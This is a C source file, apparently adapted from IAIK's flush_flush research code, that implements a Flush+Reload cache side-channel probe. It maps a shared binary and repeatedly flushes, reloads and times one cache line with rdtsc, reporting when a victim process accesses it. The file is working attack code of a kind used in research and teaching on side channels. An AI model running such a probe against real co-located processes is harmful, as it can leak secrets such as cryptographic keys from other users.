/**
 * This program is based on the work from the Institute of Applied Information Processing and Communications (IAIK)
 * available here: https://github.com/IAIK/flush_flush
 */


#include <pthread.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/time.h>

//#define THRESHOLD 120
#define PROBE_TIME 5000000UL

unsigned long old_time = 0;
unsigned long start_time = 0;

long micros();
inline int probe(char *adrs);
inline unsigned long gettime();

void flush_and_reload(void *addr) {
    /*
    Steps involved in flush+reload are:
    1. Flush the target address
    2. Wait for victim to access target
    3. Reload target and measure the time taken
    If victim accessed the target in step 2, 
    reload will commit quickly (time taken < THRESHOLD) 
    and we can ascertain that victim accessed the cache line. (success)
     */
    unsigned long time = gettime();
    if (time - old_time >= PROBE_TIME) { // PROBE_TIME defines the wait period (step 2)
        size_t delta = probe(addr); /* measures the time taken for reload, 
                                    followed by a clflush (step 3, then step 1)
                                    */
        if (delta < THRESHOLD) { // if this condition is true, victim accessed cache line (success)
            printf("Cache Hit %10lu after %10lu us\n", delta, micros() - start_time);
        }
        old_time = time;
    }
}

int main(int argc, char **argv) {
    if (argc != 3)
        return 1;
    char *filename = argv[1];
    char *offsetp = argv[2];
    unsigned int offset = 0;
    // propely typeset offsetp
    if (!sscanf(offsetp, "%x", &offset))
        return 2;
    int fd = open(filename, O_RDONLY);
    if (fd < 3)
        return 3;
    // map the binary (upto 64 MB)
    unsigned char *addr = (unsigned char *) mmap(0, 64 * 1024 * 1024, PROT_READ, MAP_SHARED, fd, 0);
    if (addr == (void *) -1)
        return 4;
    start_time = micros();
    // continuously probe the cache line
    while (1) {
        flush_and_reload(addr + offset);
        sched_yield();
    }
    return 0;
}

long micros() {
    struct timeval current;
    gettimeofday(&current, NULL);
    return current.tv_sec * (int) 1e6 + current.tv_usec;
}

inline int probe(char *adrs) { 
    volatile unsigned long time;
    asm __volatile__ (
    "  mfence             \n"
    "  lfence             \n"
    "  rdtsc              \n"   // timestamp t1 taken
    "  lfence             \n"
    "  movl %%eax, %%esi  \n"
    "  movl (%1), %%eax   \n"   // read issued, implying a reload if necessary
    "  lfence             \n"
    "  rdtsc              \n"   // timestamp t2 taken
    "  subl %%esi, %%eax  \n"   // t2-t1 calculated, providing time measurement (step 3)
    "  clflush 0(%1)      \n"   // evicts cache line from the cache hierarchy (step 1)
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");
    return time;
}

inline unsigned long gettime() {
    volatile unsigned long tl;
    asm __volatile__(
    "lfence\n"
    "rdtsc"
    : "=a" (tl)
    :
    : "%edx");

    return tl;
}
